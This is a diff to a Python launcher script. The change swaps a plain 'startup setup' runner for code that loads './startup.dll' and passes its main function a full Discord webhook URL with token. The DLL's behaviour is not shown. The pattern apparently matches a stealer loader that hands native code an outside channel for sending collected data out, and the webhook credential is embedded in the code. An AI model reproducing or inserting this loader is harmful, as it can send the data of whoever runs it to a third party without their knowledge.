@@ -1,20 +1,10 @@
 import ctypes
-import os
-import sys
 
-def main():
-    # Load the shared library
-    lib = ctypes.CDLL("startup.dll")
+# Load the DLL
+mylibrary = ctypes.CDLL('./startup.dll')
 
-    # Call the exported Run function
-    result = lib.Run()
+# Define the argument type as a string (CString)
+mylibrary.main.argtypes = [ctypes.c_char_p]
 
-    # Output results
-    if result == 0:
-        print("Startup setup completed successfully.")
-    else:
-        print(f"An error occurred. Error code: {result}")
-        sys.exit(result)
-
-if __name__ == "__main__":
-    main()
+# Call the main function with a string argument
+mylibrary.main(b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe")  # The argument must be a byte string (b"")
